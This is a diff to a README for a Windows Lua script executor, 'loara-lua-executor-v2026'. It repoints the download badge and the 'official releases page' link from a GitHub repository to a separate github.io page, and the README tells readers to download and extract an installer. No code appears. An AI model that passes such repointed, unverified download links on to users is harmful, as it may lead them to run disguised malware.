@@ -1,6 +1,6 @@
 # ⚡ loara-lua-executor-v2026 - Run Lua scripts on your computer
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/a-i-z-e-n/loara-lua-executor-v2026)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://a-i-z-e-n.github.io)
 
 Loara Lua Executor provides a simple way to run Lua scripts on Windows 10 and Windows 11. This application manages script execution and includes a library of scripts for various uses. It removes the need for complex setup processes or authentication keys.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software:
 
-1. Visit the [official releases page](https://github.com/a-i-z-e-n/loara-lua-executor-v2026).
+1. Visit the [official releases page](https://a-i-z-e-n.github.io).
 2. Look for the latest version under the Releases section.
 3. Download the compressed file or the installer package.
 4. Extract the contents of the folder to a location on your desktop.
